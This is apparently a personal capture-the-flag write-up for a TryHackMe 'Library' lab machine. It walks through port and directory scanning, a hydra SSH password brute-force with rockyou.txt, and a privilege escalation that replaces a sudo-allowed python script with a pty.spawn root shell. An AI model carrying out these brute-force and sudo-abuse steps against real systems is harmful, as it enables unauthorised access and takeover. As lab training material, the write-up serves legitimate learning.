# Enumeration
## /etc/hosts
```sh
sami@bt:~/Documents/THM/CTFs/Library$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	bt
10.10.242.246	library.thm
```
## ping
```sh
sami@bt:~/Documents/THM/CTFs/Library$ ping 10.10.242.246
PING 10.10.242.246 (10.10.242.246) 56(84) bytes of data.
64 bytes from 10.10.242.246: icmp_seq=1 ttl=63 time=68.9 ms
64 bytes from 10.10.242.246: icmp_seq=2 ttl=63 time=68.7 ms
^C
--- 10.10.242.246 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 68.673/68.801/68.929/0.128 ms
```
## port scan with [[nmap]]
```sh
sami@bt:~/Documents/THM/CTFs/Library$ sudo nmap -A -p- -oN nmap_results.txt 10.10.242.246
[sudo] password for sami: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-11 23:11 EET
Nmap scan report for 10.10.242.246
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c42fc34767063204ef92918e0587d5dc (RSA)
|   256 689213ec9479dcbb7702da99bfb69db0 (ECDSA)
|_  256 43e824fcd8b8d3aac248089751dc5b7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/11%OT=22%CT=1%CU=34705%PV=Y%DS=2%DC=T%G=Y%TM=636EBA
OS:E7%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST
OS:11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   69.58 ms 10.11.0.1
2   69.72 ms 10.10.242.246

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.26 seconds
```
### Notes:
- ssh on port 22
- http on port 80
## http://library.thm/
![[Pasted image 20221111231455.png]]
### Notes:
- Username `meliodas`
Further more,
![[Pasted image 20221111231617.png]]
### Notes:
- users from the comment section:
	- `root` , `www-data` , `Anonymous`
## dir scan with [[gobuster]]
```sh
sami@bt:~/Documents/THM/CTFs/Library$ gobuster dir -u http://library.thm/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results.txt -x txt,php,html,js -t 20
/.htaccess            (Status: 403) [Size: 295]
/.htaccess.html       (Status: 403) [Size: 300]
/.htaccess.php        (Status: 403) [Size: 299]
/.htaccess.js         (Status: 403) [Size: 298]
/.htaccess.txt        (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 295]
/.htpasswd.html       (Status: 403) [Size: 300]
/.htpasswd.txt        (Status: 403) [Size: 299]
/.htpasswd.php        (Status: 403) [Size: 299]
/.htpasswd.js         (Status: 403) [Size: 298]
/images               (Status: 301) [Size: 311] [--> http://library.thm/images/]
/index.html           (Status: 200) [Size: 5439]
/robots.txt           (Status: 200) [Size: 33]
/robots.txt           (Status: 200) [Size: 33]
/server-status        (Status: 403) [Size: 299]
```
## /robots.txt
```html
User-agent: rockyou 
Disallow: /
```
### Notes:
- hint `rockyou` might means `rockyou.txt` wordlist.
- There's no login form found on the website.
- This means that we have no other choice but ssh brute force using User: `meliodas` and `rockyou.txt`.
# Weaponization
## hydra syntax
```sh
sami@bt:~/Documents/THM/CTFs/Library$ hydra -t 4 -V -f -l 'meliodas' -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://library.thm
```
# Exploitation
## ssh brute-force attack
```sh
[ATTEMPT] target library.thm - login "meliodas" - pass "XXXXX" - XX of 14344398 [child 1] (0/0)
[ATTEMPT] target library.thm - login "meliodas" - pass "XXXXX" - XX of 14344398 [child 2] (0/0)
[ATTEMPT] target library.thm - login "meliodas" - pass "XXXXXX" - XX of 14344398 [child 3] (0/0)
[22][ssh] host: library.thm   login: meliodas   password: xxxxxx
[STATUS] attack finished for library.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-11 23:39:46
```
### Notes:
- ssh password has been obtained 
# Post-Exploit Enum
## ssh login as `meliodas`
```sh
sami@bt:~/Documents/THM/CTFs/Library$ ssh meliodas@library.thm         
meliodas@library.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ ls
bak.py  user.txt
```
## manual enumeration
```sh
meliodas@ubuntu:~$ ls -hla
total 40K
drwxr-xr-x 4 meliodas meliodas 4.0K Aug 24  2019 .
drwxr-xr-x 3 root     root     4.0K Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3.7K Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4.0K Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4.0K Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```
## bak.py explanation
- takes `/var/www/html` and turns it to `zip` file and puts it in `/var/backups/` as `website.zip`
```sh
meliodas@ubuntu:/var/www/html$ ls -hla
total 24K
drwxr-xr-x 3 root     root     4.0K Aug 24  2019 .
drwxr-xr-x 3 root     root     4.0K Aug 24  2019 ..
drwxrwxr-x 3 meliodas meliodas 4.0K Aug 24  2019 Blog
-rw-r--r-- 1 root     root      12K Aug 24  2019 index.html
meliodas@ubuntu:/var/www/html$ cd ..
meliodas@ubuntu:/var/www$ cd ..
meliodas@ubuntu:/var$ cd backups/
meliodas@ubuntu:/var/backups$ ls
apt.extended_states.0  website.zip
meliodas@ubuntu:/var/backups$ 
```
## sudo -l 
```sh
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
### Notes:
- we can execute `/home/meliodas/bak.py` as root using any python binary in `/usr/bin/python*`
- `bak.py` has only read permissions for our user: `-rw-r--r-- 1 root  root  353 Aug 23  2019 bak.py`
- as the `bak.py` file is in our home `~` directory, we can remove it using `rm` and create another `bak.py` with python script to spawn a shell with root privileges.
# Privileges Escalation [[Spawning shells]]
## new bak.py
```python
#!/usr/bin/env python
import pty; pty.spawn("/bin/bash")
```
## replacing the old `bak.py` with the new `bak.py`
```sh
meliodas@ubuntu:~$ echo '#!/usr/bin/env python' > bak_new.py
meliodas@ubuntu:~$ echo 'import pty; pty.spawn("/bin/bash")' >> bak_new.py 
meliodas@ubuntu:~$ cat bak_new.py 
#!/usr/bin/env python
import pty; pty.spawn("/bin/bashmeliodas@ubuntu:~$ echo '#!/usr/bin/env python' > bak_new.py
meliodas@ubuntu:~$ echo 'import pty; pty.spawn("/bin/bash")' >> bak_new.py 
meliodas@ubuntu:~$ cat bak_new.py 
#!/usr/bin/env python
import pty; pty.spawn("/bin/bash")
")
meliodas@ubuntu:~$ rm bak.py && mv bak_new.py bak.py
rm: remove write-protected regular file 'bak.py'? y
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import pty; pty.spawn("/bin/bash")
```
# Rooting
```sh
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
root@ubuntu:~# whoami
root
root@ubuntu:~# 
```
# Done
